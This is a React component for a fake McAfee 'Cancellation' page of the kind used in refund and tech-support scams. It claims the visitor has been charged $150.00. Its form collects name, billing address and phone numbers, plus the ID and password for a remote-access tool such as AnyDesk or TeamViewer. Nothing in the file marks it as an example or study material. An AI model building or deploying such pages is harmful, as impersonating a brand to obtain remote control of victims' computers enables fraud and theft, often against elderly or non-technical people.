export default function CancelMcAfeePage() {
  return (
    <main className="main-container">
      <div className="cancel-card">
        <div className="cancel-header">
          <div className="cancel-logo">McAfee</div>
          <h1 className="cancel-title">Cancellation</h1>
          <p className="cancel-subtitle">Account Security &amp; Refund Processing</p>
        </div>

        <p className="cancel-intro">
          Welcome to the <span className="cancel-highlight">Cancellation</span> team.
          <br />
          Your account has been charged a one-time fee of{' '}
          <span className="cancel-amount">$150.00</span>.
        </p>

        <p className="cancel-text">
          Please provide your details below so we can verify your request and route you to a refund
          manager.
        </p>

        <form className="cancel-form">
          <div className="cancel-field">
            <label className="cancel-label">Full Name</label>
            <input className="cancel-input" type="text" name="fullName" />
          </div>

          <div className="cancel-field">
            <label className="cancel-label">Billing Address</label>
            <input className="cancel-input" type="text" name="billingAddress" />
          </div>

          <div className="cancel-field">
            <label className="cancel-label">Cell Phone</label>
            <input className="cancel-input" type="tel" name="cellPhone" />
          </div>

          <div className="cancel-field">
            <label className="cancel-label">Home Phone</label>
            <input className="cancel-input" type="tel" name="homePhone" />
          </div>

          <div className="cancel-field">
            <label className="cancel-label">Cancellation Reason</label>
            <select className="cancel-select" name="cancellationReason">
              <option value="Not Compatible">Not Compatible</option>
              <option value="Software Not Working">Software Not Working</option>
              <option value="No Longer Needed">No Longer Needed</option>
            </select>
          </div>

          <div className="cancel-remote-row">
            <div className="cancel-remote-field">
              <label className="cancel-label">Remote Software</label>
              <select className="cancel-select" name="remoteSoftware">
                <option value="Alpemix">Alpemix</option>
                <option value="Ultra Viewer">Ultra Viewer</option>
                <option value="Chromebook">Chromebook</option>
                <option value="AnyDesk">AnyDesk</option>
                <option value="Hoptodesk">Hoptodesk</option>
                <option value="Teamviewer">Teamviewer</option>
              </select>
            </div>

            <div className="cancel-remote-field">
              <label className="cancel-label">Remote ID</label>
              <input className="cancel-input" type="text" name="remoteId" />
            </div>

            <div className="cancel-remote-field">
              <label className="cancel-label">Remote Pass</label>
              <input className="cancel-input" type="text" name="remotePass" />
            </div>
          </div>

          <button type="button" className="cancel-button">
            Cancel &gt;&gt;
          </button>
        </form>

        <p className="cancel-note">
          By proceeding, you confirm that the above details are accurate and that you wish to initiate
          the cancellation and uninstallation process.
        </p>
      </div>
    </main>
  )
}


